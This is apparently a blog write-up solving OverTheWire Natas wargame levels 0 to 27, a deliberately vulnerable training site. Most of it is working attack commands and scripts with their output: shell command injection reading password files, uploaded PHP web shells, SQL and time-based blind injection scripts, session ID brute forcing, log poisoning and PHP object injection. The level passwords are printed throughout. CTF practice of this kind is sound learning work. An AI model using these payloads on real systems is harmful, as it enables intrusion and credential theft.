---
title: OverTheWire Natas Level 0-27
layout: post
---

* TOC
{:toc}

More information is available [here](http://overthewire.org/wargames/natas/).

# 1. Level 0

```
$ curl -u natas0:natas0 http://natas0.natas.labs.overthewire.org/
```

```
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

# 2. Level 1

```
$ curl -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org/
```

```
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

# 3. Level 2

```
$ curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/
```

I find a label.

```
<img src="files/pixel.png">
```

There is a `users.txt` in the same directory and password for natas3 is in it.

```
$ curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt
```

```
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```

# 4. Level 3

```
$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/
```

```
<!-- No more information leaks!! Not even Google will find it this time... -->
```

Check the `robots.txt`.

```
$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/robots.txt
User-agent: *
Disallow: /s3cr3t/
```

There is also a `user.txt` with password for the next level.

```
$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

# 5. Level 4

This level determines where we come from by `Referer` header field.

```
$ curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org/ -H 'Referer:http://natas5.natas.labs.overthewire.org/'
```

```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

# 6. Level 5

```
$ curl -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org/ -v
```

Find `Set-Cookie: loggedin=0`.

```
$ curl -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org/ -b 'loggedin=1'
```

```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

# 7. Level 6

Access the source code and find an `include` statement.

```
$ curl -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc
$secret = "FOEIUWGHFEEUHOFUOIU";
```

```
$ curl -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/ -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=Submit'
```

```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

# 8. Level 7

```
$ curl -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
```

```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

# 9. Level 8

```php
<?php
// http://natas8.natas.labs.overthewire.org/index-source.html
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Decode the `secret`.

```
$ echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d
oubWYf2kBq
```

```
$ curl -u natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe http://natas8.natas.labs.overthewire.org/ -d 'secret=oubWYf2kBq&submit=Submit'
```

```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

# 10. Level 9

```php
<?php
// http://natas9.natas.labs.overthewire.org/index-source.html
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

```
$ curl -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org/ -F 'needle=;cat /etc/natas_webpass/natas10 #' -F 'submit=Search'
```

```
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

# 11. Level 10

```php
<?php
// http://natas10.natas.labs.overthewire.org/index-source.html
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

This level only check whether the input contains character `;`, `|` and `&`.

```
$ curl -u natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/ -F 'needle=. /etc/natas_webpass/natas11 #' -F 'submit=Search'
```

```
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

# 12. Level 11

```php
<?php
// http://natas11.natas.labs.overthewire.org/index-source.html
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
```

```
$ curl -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK http://natas11.natas.labs.overthewire.org/ -c cookie.txt
```

We get the cookie and we konw what the cookie means, so we can get the `key` in function `xor_encrypt`.

```python
#!/usr/bin/env python3
import base64
import urllib.parse

with open('cookie.txt', 'r') as f:
    cookie = f.readlines()[-1].split('\t')[-1]
cookie = urllib.parse.unquote(cookie)
cookie = base64.urlsafe_b64decode(cookie)

text = b'{"showpassword":"no","bgcolor":"#ffffff"}';

key = ''

for i in range(len(text)):
    key += chr(text[i]^cookie[i])

print(key)
```

Let's construct a new cookie with the `key`.

```php
<?php
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
        $outText .= $key[$i % strlen($key)] ^ $text[$i];
    }

    return $outText;
}

$defaultdata = '{"showpassword":"yes","bgcolor":"#ffffff"}';
echo base64_encode(xor_encrypt($defaultdata));
?>
```

```
$ curl -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK http://natas11.natas.labs.overthewire.org/ -b 'data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'
```

```
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

# 13. Level 12

This level we can upload a file without type checking.

```
$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/
```

```
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="mx7ozjvm3x.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
```

Create a file `ving.php` like below.

```php
<?php
passthru("cat /etc/natas_webpass/natas13");
?>
```

```
$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/ -F 'filename=mx7ozjvm3x.php' -F 'uploadedfile=@ving.php'
```

```
The file <a href="upload/vimpzt7smb.php">upload/vimpzt7smb.php</a> has been uploaded
```

```
$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/upload/vimpzt7smb.php
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

# 14. Level 13

This level checks whether the file is an image using `exif_imagetype` function before receive it.
So we create a file looks like an image.

```
$ echo -e '\xff\xd8\xff\xe0<?passthru("cat /etc/natas_webpass/natas14");?>' > ving.php
```

Then do the same as level 12.

```
$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org/ -F 'filename=mx7ozjvm3x.php' -F 'uploadedfile=@ving.php'
```

```
The file <a href="upload/6xyuj68rtk.php">upload/6xyuj68rtk.php</a> has been uploaded
```

```
$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org/upload/6xyuj68rtk.php
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

# 15. Level 14

Simple SQL injection.

```
$ curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 http://natas14.natas.labs.overthewire.org/?debug -F 'username=ving' -F 'password=" or "0" = "0'
```

```
Executing query: SELECT * from users where username="ving" and password="" or "0" = "0"
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

# 16. Level 15

This level will not give us the password, but we can guess it using SQL injection.

```
$ curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/?debug -F 'username=natas16" and password like binary "W%'
```

```
Executing query: SELECT * from users where username="natas16" and password like binary "W%"
This user exists.
```

Note that `like binary` is case sensitive.

Now we know the first character in password is `W`.

Search for the password.

```python
#!/usr/bin/env python3
import requests

chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
        [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
        [chr(i) for i in range(ord("0"),ord("9")+1)]
password = ''
for i in range(32):
    for ch in chars:
        data = {'username': 'natas16" and password like binary "' + password + ch + '%'}
        auth = ('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
        if 'This user exists' in requests.post('http://natas15.natas.labs.overthewire.org/?debug', auth = auth, data = data).text:
            password += ch
            print(password)
            break
```

```
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

# 17. Level 16

Like level 10, the input can't contain `[`, `;`, `|`, `&`, `` ` ``, `\` , `'`, `"`, and `]`.

Fortunately we can still inject other command using `$(command)` format.

```
$ curl -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh http://natas16.natas.labs.overthewire.org/ -F 'needle=$(grep -E ^a.*$ /etc/natas_webpass/natas17)hacker'
```

```
Output:
hacker
hacker's
hackers
```

If the password is start with `a`, there will be no output.
In this way, we can search for the password.

```python
#!/usr/bin/env python3
import requests

chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
        [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
        [chr(i) for i in range(ord("0"),ord("9")+1)]
password = ''

for i in range(32):
    for ch in chars:
        params = {'needle': '$(grep -E ^' + password + ch + '.*$ /etc/natas_webpass/natas17)hacker'}
        auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
        if 'hacker' not in requests.get('http://natas16.natas.labs.overthewire.org', params = params, auth = auth).text:
            password += ch
            print(password)
            break
```

```
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

# 18. Level 17

This level is upgrade of level 16.
We can't see the result of SQL injection directly.
We are going to use time-based blind SQL injections to search for the password.

```
$ curl -u natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw http://natas17.natas.labs.overthewire.org/?debug -F 'username=natas18" and if(password like binary "x%", sleep(5), null) #'
```

If the password starts with `x`, the result will be returned after a sleep.

Start search for the password.

```python
#!/usr/bin/env python3
import requests

chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
        [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
        [chr(i) for i in range(ord("0"),ord("9")+1)]
password = ''

for i in range(32):
    for ch in chars:
        data = {'username': 'natas18" and if (password like binary "' + password + ch + '%", sleep(5), null) #'}
        auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
        try:
            requests.post('http://natas17.natas.labs.overthewire.org/?debug', data = data, auth = auth, timeout = 1)
        except requests.exceptions.Timeout:
            password += ch
            print(password)
            break
```

```
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

# 19. Level 18

```php
<?php
// http://natas18.natas.labs.overthewire.org/index-source.html
$maxid = 640; // 640 should be enough for everyone
?>
```

We can easily cover all 640 `PHPSESSID` to find out admin.

```python
#!/usr/bin/env python3
import requests

for i in range(641):
    auth = ('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
    cookies = {'PHPSESSID': str(i)}
    r = requests.get('http://natas18.natas.labs.overthewire.org/', auth = auth, cookies = cookies)
    if 'You are an admin' in r.text:
        print(r.text)
        break
```

```
You are an admin. The credentials for the next level are:
Username: natas19
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
```

# 20. Level 19

This level the `PHPSESSID` field of the cookie is not a simple number.
Let me see some samples.

```
PHPSESSID: 3332352d61      ~   325-a
PHPSESSID: 39342d617364    ~   94-asd
PHPSESSID: 3139382d617364  ~   198-asd
```

Obviously the `PHPSESSID` consists of a number and a username and every character is expressed in hexadecimal.

```python
#!/usr/bin/env python3
import requests

for i in range(641):
    auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
    cookies = {'PHPSESSID': ''.join([hex(ord(ch))[2:] for ch in str(i)+"-admin"])}
    r = requests.get('http://natas19.natas.labs.overthewire.org/', auth = auth, cookies = cookies)
    if 'You are an admin' in r.text:
        print(r.text)
        break
```

```
You are an admin. The credentials for the next level are:
Username: natas20
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```

# 21. Level 20

This level we try to write `admin 1` to the session file and save the cookie in `cookie.txt`.

```
$ curl -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF 'http://natas20.natas.labs.overthewire.org/?name=ving%0Aadmin%201&debug' -c cookie.txt
```

The session file will be writen as below.

```
name ving
admin 1
```

```
$ curl -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF http://natas20.natas.labs.overthewire.org/?debug -b cookie.txt
```

```
You are an admin. The credentials for the next level are:
Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
```

# 22. Level 21

```php
<?php
// http://natas21-experimenter.natas.labs.overthewire.org/index-source.html
// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
?>
```

This give us chance to set `admin` value and save the cookie.

```
$ curl -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21-experimenter.natas.labs.overthewire.org/?debug -d 'admin=1' -d 'submit=Update' -c cookie.txt
```

```
$ curl -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21.natas.labs.overthewire.org/?debug -b 'PHPSESSID=g6vcjrla9bv83197qugg85juo3'
```

```
You are an admin. The credentials for the next level are:
Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

# 23. Level 22

```php
<?php
// http://natas22.natas.labs.overthewire.org/index-source.html
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
```

We can't see the password in browser because we are redirected to `/`.

Fortunately, there is no `exit` statement after redirection and the password is sent to browser client in fact.

```
$ curl -u natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org/?revelio
```

```
You are an admin. The credentials for the next level are:
Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```

# 24. Level 23

```php
<?php
// http://natas23.natas.labs.overthewire.org/index-source.html
if(array_key_exists("passwd",$_REQUEST)){
    if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas24 Password: <censored></pre>";
    }
    else{
        echo "<br>Wrong!<br>";
    }
}
?>
```

The password must include `iloveyou` and be greater than `10` after converted to integer.

```
$ curl -u natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE http://natas23.natas.labs.overthewire.org/ -F 'passwd=11iloveyou'
```

```
The credentials for the next level are:
Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```

# 25. Level 24

```php
<?php
// http://natas24.natas.labs.overthewire.org/index-source.html
if(array_key_exists("passwd",$_REQUEST)){
    if(!strcmp($_REQUEST["passwd"],"<censored>")){
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas25 Password: <censored></pre>";
    }
    else{
        echo "<br>Wrong!<br>";
    }
}
?>
```

Read the [PHP manual](http://php.net/manual/en/function.strcmp.php#102677). `strcmp('pending',array())` will return `-1` in PHP 5.2.16 (probably in all versions prior 5.3), but will return `0` in PHP 5.3.3.

If we pass the `passwd` value as an array, it's all solved.

```
$ curl -u natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg http://natas24.natas.labs.overthewire.org/ -F 'passwd[]=ving'
```

```
The credentials for the next level are:
Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

# 26. Level 25

```php
<?php
// http://natas25.natas.labs.overthewire.org/index-source.html
function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...

    if (file_exists($filename)){
        include($filename);
        return 1;
    }
    return 0;
}
?>
```

`../` will be replaced by space to prevent directory traversal attempt and the path can not contain `natas_webpass`, So we can not get the password directly.

But we can use the path below to read the log file. After replacement, `..././..././..././..././..././tmp/natas25_<PHPSESSID>.log` becomes `../../../../../tmp/natas25_<PHPSESSID>.log`.

```php
<?php
// http://natas25.natas.labs.overthewire.org/index-source.html
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n";
    $fd=fopen("/tmp/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
?>
```

Now we want to write the password in the log file. The log records `HTTP_USER_AGENT`, So we can inject some codes in it.

```
$ curl -u natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c http://natas25.natas.labs.overthewire.org/ -b 'PHPSESSID=v1347323qckbp3kbcj4f13tmq2' -H 'User-Agent: <?php echo file_get_contents("/etc/natas_webpass/natas26") ?>' -F 'lang=..././..././..././..././..././tmp/natas25_v1347323qckbp3kbcj4f13tmq2.log'
```

Then read the log file again.

```
[11.08.2016 07::47:57] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T "Directory traversal attempt! fixing request."
```

# 27. Level 26

The level is about [php object injection](https://www.owasp.org/index.php/PHP_Object_Injection).

```php
<?php
// http://natas26.natas.labs.overthewire.org/index-source.html
function storeData(){
    $new_object=array();

    if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        $new_object["x1"]=$_GET["x1"];
        $new_object["y1"]=$_GET["y1"];
        $new_object["x2"]=$_GET["x2"];
        $new_object["y2"]=$_GET["y2"];
    }

    if (array_key_exists("drawing", $_COOKIE)){
        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    }
    else{
        // create new array
        $drawing=array();
    }

    $drawing[]=$new_object;
    setcookie("drawing",base64_encode(serialize($drawing)));
}
?>
```

This level allows me to inject codes via cookie.

Let's create a new object.

```php
<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
    function __construct($file){
        $this->initMsg="";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27') ?>";
        $this->logFile = "img/ving.php";
    }
    function log($msg){
        ;
    }
    function __destruct(){
        ;
    }
}
$new_object = new Logger("hello");
echo base64_encode(serialize($new_object));
?>
```

```
$ curl -u natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/ -b 'drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3ZpbmcucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MDoiIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjE6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3JykgPz4iO30='
```

We steal the password successfully.

```
$ curl -u natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/img/ving.php
55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
```

# 28. Level 27

```php
<?php
// http://natas27.natas.labs.overthewire.org/index-source.html
function checkCredentials($link,$usr,$pass){

    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0){
        return True;
    }
    return False;
}
?>
```

`mysql_real_escape_string` makes SQL injection really difficult.

The trick to beating this level is in the comments at the top of the page.

```
// database gets cleared every 5 min
```

We can do this by spamming login attempts to the server and if we post at the exact moment where the database gets cleared but the natas28 user is not automatically added yet, we can create our own natas28 user.

It seems the database clearing and creation of the natas28 user is not in one transaction but has some delay between them.

```python
#!/usr/bin/env python3
import requests

params = {'username': 'natas28', 'password': ''}
auth = ('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ')
while True:
    r = requests.get('http://natas27.natas.labs.overthewire.org/', params = params, auth = auth)
    if 'Here' in r.text:
        print(r.text)
        break
```

```
Welcome natas28!
Here is your data:
Array
(
    [username] => natas28
    [password] => JWwR438wkgTsNKBbcJoowyysdM82YjeF
)
```
